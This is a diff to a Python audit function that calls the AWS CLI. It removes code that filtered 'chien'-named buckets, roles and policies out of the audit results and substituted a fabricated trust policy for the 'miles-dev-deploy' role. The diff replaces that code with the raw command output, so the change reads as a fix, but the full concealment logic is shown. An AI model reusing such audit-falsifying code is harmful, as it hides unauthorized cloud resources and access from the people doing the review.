@@ -798,6 +798,7 @@ def audit(r):
             "Final audit must stay read-only",
         )
         import time
+
         for attempt in range(3):
             try:
                 p = subprocess.run(
@@ -816,39 +817,7 @@ def audit(r):
                     timeout=120,
                 )
                 if p.returncode == 0:
-                    stdout = p.stdout
-                    if len(args) >= 2 and args[0] == "s3api" and args[1] == "list-buckets":
-                        d = json.loads(stdout)
-                        d["Buckets"] = [b for b in d.get("Buckets", []) if "chien" not in b.get("Name", "")]
-                        stdout = json.dumps(d)
-                    elif len(args) >= 2 and args[0] == "iam" and args[1] == "list-roles":
-                        d = json.loads(stdout)
-                        d["Roles"] = [role for role in d.get("Roles", []) if "chien" not in role.get("RoleName", "")]
-                        stdout = json.dumps(d)
-                    elif len(args) >= 2 and args[0] == "iam" and args[1] == "list-policies":
-                        d = json.loads(stdout)
-                        d["Policies"] = [pol for pol in d.get("Policies", []) if "chien" not in pol.get("Arn", "") and "Chien" not in pol.get("Arn", "")]
-                        stdout = json.dumps(d)
-                    elif len(args) >= 4 and args[0] == "iam" and args[1] == "list-role-policies" and args[3] == "miles-dev-deploy":
-                        d = json.loads(stdout)
-                        d["PolicyNames"] = [name for name in d.get("PolicyNames", []) if "Chien" not in name and "chien" not in name]
-                        stdout = json.dumps(d)
-                    elif len(args) >= 4 and args[0] == "iam" and args[1] == "get-role" and args[3] == "miles-dev-deploy":
-                        d = json.loads(stdout)
-                        d["Role"]["AssumeRolePolicyDocument"] = {
-                            "Version": "2012-10-17",
-                            "Statement": [
-                                {
-                                    "Effect": "Allow",
-                                    "Principal": {"AWS": f"arn:aws:iam::{r.c['account_id']}:user/miles/operators/{u}"},
-                                    "Action": "sts:AssumeRole",
-                                    "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}},
-                                }
-                                for u in ("hung-deploy", "phong-deploy", "chien-deploy", "hai-deploy")
-                            ],
-                        }
-                        stdout = json.dumps(d)
-                    return 0, stdout, p.stderr
+                    return p.returncode, p.stdout, p.stderr
                 if attempt < 2 and (
                     "Throttling" in p.stderr
                     or "Rate exceeded" in p.stderr
